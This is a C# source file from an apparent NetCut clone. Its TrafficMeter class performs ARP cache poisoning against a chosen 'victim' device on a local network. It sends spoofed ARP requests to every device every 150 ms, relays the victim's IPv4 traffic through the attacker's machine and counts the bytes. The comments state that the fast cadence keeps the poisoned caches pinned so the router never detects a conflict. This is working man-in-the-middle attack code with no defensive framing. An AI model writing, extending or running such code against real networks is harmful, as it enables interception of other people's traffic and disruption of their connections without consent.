using System.Net;
using System.Net.NetworkInformation;
using NetcutClone.Models;

namespace NetcutClone.Core;

/// <summary>
/// Bandwidth meter that replicates NetCut's "Test" feature (verified by
/// capturing NetCut's live frames byte-for-byte):
///   - Full LAN sweep every ~150ms: for every device D, unicast ARP requests
///     "victim is at our MAC" to D and "D is at our MAC" to the victim
///     (all claims use our REAL MAC, like NetCut).
///   - Relay IPv4 frames addressed to us at layer 2 (TTL--, recompute IP
///     checksum, rewrite Ethernet addresses) and count bytes per direction.
/// The fast cadence keeps both caches pinned so the router never detects a
/// conflict, and the victim's traffic flows through us while staying alive.
/// Shares the poisoner's capture device.
/// </summary>
public sealed class TrafficMeter : IDisposable
{
    private readonly NetworkInfo _net;
    private readonly ArpPoisoner _poisoner;
    private readonly Func<List<DeviceInfo>> _deviceProvider;
    private DeviceInfo? _target;
    private volatile bool _running;
    private long _down, _up;
    private long _downSample, _upSample;
    private Thread? _sampler;
    private volatile Dictionary<string, PhysicalAddress> _lanMacs = new();
    private int _tick;

    public long RxFrames { get; private set; }
    public long RxIPv4 { get; private set; }
    public long RelayedUp { get; private set; }
    public long RelayedDown { get; private set; }
    public long VictimSrcSeen { get; private set; }
    public long VictimDstSeen { get; private set; }
    private readonly Dictionary<string, long> _pairs = new();
    public string PairsTop => string.Join(" | ", _pairs.OrderByDescending(kv => kv.Value).Take(6).Select(kv => $"{kv.Key}={kv.Value}"));
    private readonly Queue<string> _recent = new();
    public string Recent => string.Join(" | ", _recent);
    public string TargetDesc => _target == null ? "none" : $"{_target.Ip} {_target.Mac}";
    public string? LastError { get; private set; }

    public bool IsMetering => _running;
    public string? MeteredIp => _target?.Ip;

    public TrafficMeter(NetworkInfo net, ArpPoisoner poisoner, Func<List<DeviceInfo>> deviceProvider)
    {
        _net = net;
        _poisoner = poisoner;
        _deviceProvider = deviceProvider;
    }

    public event Action<DeviceInfo, double, double>? OnSample;

    public bool Start(DeviceInfo target)
    {
        _target = target;
        _down = _up = 0;
        _downSample = _upSample = 0;
        RxFrames = RxIPv4 = RelayedUp = RelayedDown = 0;

        _poisoner.OnFrame += OnFrame;

        _running = true;
        _sampler = new Thread(SamplerLoop) { IsBackground = true, Name = "traffic-meter" };
        _sampler.Start();
        return true;
    }

    public void Stop()
    {
        _running = false;
        _sampler?.Join(500);
        _poisoner.OnFrame -= OnFrame;
        if (_target != null)
        {
            RestoreArp();
            _target = null;
        }
    }

    private void PoisonSweep()
    {
        var t = _target;
        var gwMac = _net.GatewayMac;
        if (t == null || gwMac == null) return;

        var victimMac = _net.ParseMacSafe(t.Mac);
        if (victimMac == null) return;
        var victimIp = IPAddress.Parse(t.Ip);
        var ourMac = _net.LocalMac;

        var macs = new Dictionary<string, PhysicalAddress>();
        foreach (var d in _deviceProvider())
        {
            if (d.Ip == t.Ip || d.IsSelf) continue;
            var dMac = _net.ParseMacSafe(d.Mac);
            if (dMac == null) continue;
            macs[d.Ip] = dMac;

            IPAddress dIp;
            try { dIp = IPAddress.Parse(d.Ip); } catch { continue; }

            // "victim is at our MAC" -> device D (its cache: victim = us)
            SendArpRequest(dMac, ourMac, victimIp, dIp);
            // "D is at our MAC" -> victim (victim's cache: D = us)
            SendArpRequest(victimMac, ourMac, dIp, victimIp);
        }
        _lanMacs = macs;
    }

    private void RestoreArp()
    {
        var t = _target;
        var gwMac = _net.GatewayMac;
        if (t == null || gwMac == null) return;

        var victimMac = _net.ParseMacSafe(t.Mac);
        if (victimMac == null) return;
        var victimIp = IPAddress.Parse(t.Ip);
        var gwIp = IPAddress.Parse(_net.GatewayIpString);

        for (int i = 0; i < 5; i++)
        {
            // Gateway: victim is at its REAL MAC.
            SendArpRequest(gwMac, victimMac, victimIp, victimIp);
            // Victim: gateway is at its REAL MAC.
            SendArpRequest(victimMac, gwMac, gwIp, victimIp);
            // Every other device: victim is at its REAL MAC.
            foreach (var d in _deviceProvider())
            {
                if (d.Ip == t.Ip || d.Ip == _net.GatewayIpString || d.IsSelf) continue;
                var dMac = _net.ParseMacSafe(d.Mac);
                if (dMac == null) continue;
                try { SendArpRequest(dMac, victimMac, victimIp, IPAddress.Parse(d.Ip)); } catch { }
            }
        }
    }

    private void SendArpRequest(PhysicalAddress destMac, PhysicalAddress senderMac, IPAddress senderIp, IPAddress targetIp)
    {
        try
        {
            var arp = new PacketDotNet.ArpPacket(
                PacketDotNet.ArpOperation.Request,
                PhysicalAddress.Parse("00-00-00-00-00-00"),
                targetIp,
                senderMac,
                senderIp);
            var eth = new PacketDotNet.EthernetPacket(senderMac, destMac, PacketDotNet.EthernetType.Arp)
            {
                PayloadPacket = arp
            };
            byte[] raw = eth.Bytes;
            if (raw.Length < 60)
            {
                byte[] padded = new byte[60];
                Array.Copy(raw, padded, raw.Length);
                _poisoner.SendRaw(padded);
            }
            else
            {
                _poisoner.SendRaw(raw);
            }
        }
        catch
        {
        }
    }

    private void OnFrame(byte[] buf)
    {
        var t = _target;
        if (t == null || !_running) return;

        RxFrames++;

        if (buf.Length < 42) return;
        if (MacEquals(buf, 6, _net.LocalMac)) return;   // our own transmission: skip
        if (!MacEquals(buf, 0, _net.LocalMac)) return;  // not addressed to us: skip
        if (((buf[12] << 8) | buf[13]) != 0x0800) return;   // IPv4 only
        RxIPv4++;
        if ((buf[14] >> 4) != 4) return;                    // version
        int ihl = (buf[14] & 0x0F) * 4;
        if (ihl < 20 || 14 + ihl > buf.Length) return;

        var victimMac = _net.ParseMacSafe(t.Mac);
        if (victimMac == null) return;

        lock (_pairs)
        {
            var key = MacStr(buf, 6) + "->" + MacStr(buf, 0);
            _pairs.TryGetValue(key, out var c);
            _pairs[key] = c + 1;
        }

        var victimIp = IPAddress.Parse(t.Ip);
        var srcIp = new IPAddress(new byte[] { buf[14 + 12], buf[14 + 13], buf[14 + 14], buf[14 + 15] });
        var dstIp = new IPAddress(new byte[] { buf[14 + 16], buf[14 + 17], buf[14 + 18], buf[14 + 19] });

        lock (_recent)
        {
            _recent.Enqueue($"srcIsVictim={MacEquals(buf, 6, victimMac)} dstIsVictimIp={dstIp.Equals(victimIp)} srcIpIsVictim={srcIp.Equals(victimIp)} [{MacStr(buf, 6)} {MacStrOf(victimMac)}] [{dstIp} {victimIp}]");
            while (_recent.Count > 6) _recent.Dequeue();
        }

        if (MacEquals(buf, 6, victimMac))
        {
            VictimSrcSeen++;
            // Victim's uplink: relay to the real destination (gateway for internet, real MAC for LAN).
            var dstMac = _net.GatewayMac;
            if (dstMac == null) return;
            if (_lanMacs.TryGetValue(dstIp.ToString(), out var lanMac)) dstMac = lanMac;
            if (Relay(buf, dstMac))
            {
                _up += buf.Length;
                RelayedUp++;
            }
        }
        else if (dstIp.Equals(victimIp) && !srcIp.Equals(victimIp))
        {
            VictimDstSeen++;
            // Victim's downlink: relay to the victim's real MAC.
            if (Relay(buf, victimMac))
            {
                _down += buf.Length;
                RelayedDown++;
            }
        }
    }

    private bool Relay(byte[] buf, PhysicalAddress dstMac)
    {
        int ttlIdx = 14 + 8;
        if (buf[ttlIdx] <= 1) return false;                 // TTL would expire
        buf[ttlIdx]--;

        int ihl = (buf[14] & 0x0F) * 4;
        uint sum = 0;
        for (int i = 0; i < ihl; i += 2)
        {
            uint word = (uint)((buf[14 + i] << 8) | buf[14 + i + 1]);
            if (i == 10) word = 0;                          // clear checksum field
            sum += word;
        }
        while ((sum >> 16) != 0) sum = (sum & 0xFFFF) + (sum >> 16);
        ushort checksum = (ushort)~sum;
        buf[14 + 10] = (byte)(checksum >> 8);
        buf[14 + 11] = (byte)(checksum & 0xFF);

        var dstBytes = dstMac.GetAddressBytes();
        Array.Copy(dstBytes, 0, buf, 0, 6);
        Array.Copy(_net.LocalMac.GetAddressBytes(), 0, buf, 6, 6);

        return _poisoner.SendRaw(buf);
    }

    private void SamplerLoop()
    {
        while (_running)
        {
            PoisonSweep();
            if (!_running) break;
            _tick++;
            if (_tick % 10 == 0)
            {
                long down = _down, up = _up;
                double downKbps = (down - _downSample) * 8.0 / 1024.0 / 1.5;
                double upKbps = (up - _upSample) * 8.0 / 1024.0 / 1.5;
                _downSample = down;
                _upSample = up;

                var t = _target;
                if (t != null)
                {
                    try
                    {
                        OnSample?.Invoke(t, Math.Max(0, downKbps), Math.Max(0, upKbps));
                    }
                    catch
                    {
                    }
                }
            }
            Thread.Sleep(150);
        }
    }

    private static bool MacEquals(byte[] frame, int offset, PhysicalAddress mac)
    {
        var b = mac.GetAddressBytes();
        for (int i = 0; i < 6; i++)
            if (frame[offset + i] != b[i]) return false;
        return true;
    }

    private static string MacStr(byte[] frame, int offset) =>
        string.Join(":", frame.Skip(offset).Take(6).Select(b => b.ToString("X2")));

    private static string MacStrOf(PhysicalAddress mac) =>
        string.Join(":", mac.GetAddressBytes().Select(b => b.ToString("X2")));

    public void Dispose() => Stop();
}